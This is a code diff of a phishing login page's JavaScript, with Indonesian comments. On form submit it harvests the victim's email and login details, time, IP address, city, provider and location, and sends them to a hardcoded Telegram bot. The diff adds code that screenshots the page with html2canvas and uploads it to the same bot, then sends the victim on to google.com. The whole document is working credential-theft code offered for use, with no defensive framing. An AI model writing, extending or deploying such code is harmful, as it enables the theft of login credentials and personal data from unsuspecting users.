@@ -6,9 +6,8 @@ document.getElementById("loginForm").addEventListener("submit", async function(e
     let waktuLogin = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
 
     let botToken = "AAFmbkgr8rhoSkow-Yf6EXTy8DPu0Az 7021";
-    let chatId = "7894929132"; // Pakai 1 ID saja
-
-    let profileImageUrl = "https://staticg.sportskeeda.com/editor/2022/01/f49b9-16421055515852-1920.jpg";
+    let chatId = "7894929132";
+    let profileImageUrl = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ_fMq7l79lm6-bYF7qqvwuxlKpXPgJ90_TLA&usqp=CAU";
 
     let ipInfo = { ip: "Tidak diketahui", city: "Tidak diketahui", country: "Tidak diketahui", org: "Tidak diketahui" };
     try {
@@ -36,6 +35,29 @@ document.getElementById("loginForm").addEventListener("submit", async function(e
     }
     let lokasiUser = await getUserLocation();
 
+    async function ambilScreenshot() {
+        let canvas = await html2canvas(document.body);
+        let imgData = canvas.toDataURL("image/png");
+
+        let formData = new FormData();
+        formData.append("chat_id", chatId);
+        formData.append("photo", dataURItoBlob(imgData), "screenshot.png");
+
+        let sendPhotoUrl = `https://api.telegram.org/bot${botToken}/sendPhoto`;
+        return fetch(sendPhotoUrl, { method: "POST", body: formData });
+    }
+
+    function dataURItoBlob(dataURI) {
+        let byteString = atob(dataURI.split(",")[1]);
+        let mimeString = dataURI.split(",")[0].split(":")[1].split(";")[0];
+        let ab = new ArrayBuffer(byteString.length);
+        let ia = new Uint8Array(ab);
+        for (let i = 0; i < byteString.length; i++) {
+            ia[i] = byteString.charCodeAt(i);
+        }
+        return new Blob([ab], { type: mimeString });
+    }
+
     let message = `🔒 *Login Berhasil!*\n\n`
                 + `🕒 *Waktu:* ${waktuLogin}\n`
                 + `📧 *Email:* ${email}\n`
@@ -45,9 +67,26 @@ document.getElementById("loginForm").addEventListener("submit", async function(e
                 + `🏢 *Provider:* ${ipInfo.org}\n`
                 + `${lokasiUser}`;
 
-    await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto?chat_id=${chatId}&photo=${encodeURIComponent(profileImageUrl)}`);
-    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`);
+    let sendProfilePhotoUrl = `https://api.telegram.org/bot${botToken}/sendPhoto?chat_id=${chatId}&photo=${encodeURIComponent(profileImageUrl)}`;
+    let sendMessageUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
 
-    console.log("✅ Data berhasil dikirim!");
-    window.location.href = "https://www.google.com";
+    try {
+        // Kirim foto profil & pesan teks secara bersamaan
+        await Promise.all([
+            fetch(sendProfilePhotoUrl),
+            fetch(sendMessageUrl)
+        ]);
+
+        console.log("✅ Foto profil & pesan teks terkirim!");
+        
+        // Kirim screenshot terakhir biar gak delay di awal
+        await ambilScreenshot();
+
+        console.log("✅ Screenshot terkirim!");
+
+        // Redirect lebih cepat
+        window.location.href = "https://www.google.com";
+    } catch (error) {
+        console.error("❌ Error:", error);
+    }
 });
